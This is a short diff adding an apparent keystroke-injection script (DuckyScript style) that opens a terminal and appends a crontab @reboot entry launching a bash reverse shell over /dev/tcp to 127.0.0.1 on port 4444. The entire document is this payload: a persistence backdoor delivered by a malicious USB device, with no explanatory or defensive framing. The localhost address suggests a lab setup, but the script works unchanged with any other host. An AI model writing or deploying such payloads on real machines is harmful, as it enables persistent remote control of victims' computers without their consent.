@@ -1,0 +1,5 @@
+DELAY 1000
+CTRL ALT t
+DELAY 1200
+STRING (crontab -l 2>/dev/null; echo "@reboot /bin/bash -i >& /dev/tcp/127.0.0.1/4444 0>&1") | crontab - && crontab -l
+ENTER
